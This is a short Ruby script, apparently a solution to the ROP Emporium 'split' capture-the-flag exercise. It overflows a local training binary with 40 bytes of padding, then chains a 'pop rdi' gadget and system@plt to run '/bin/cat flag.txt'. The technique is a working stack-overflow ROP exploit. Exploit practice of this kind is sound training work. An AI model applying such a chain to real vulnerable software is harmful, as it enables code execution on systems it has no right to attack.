require 'pwn'

#python ROPgadget.py --binary ~/ctf/ropemporium/split/split --ropchain
pop_rdi    = 0x0000000000400883 # pop rdi ; ret
#gdb-peda => p system
system_plt = 0x4005e0
#vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 section=.data type=ascii string=/bin/cat flag.txt
#gdb-peda => find '/bin/'
print_flag = 0x00601060

# RIP offset is at 40
rop = "A" * 40

# Pop command we want to RDI
rop += p64(pop_rdi)
rop += p64(print_flag)

# call system@plt
rop += p64(system_plt)

# Start process and send rop chain
e = Tubes::Process.new('./split', out: :pty)
print e.recv()
e.sendline(rop)

# Print output
print e.recvall()
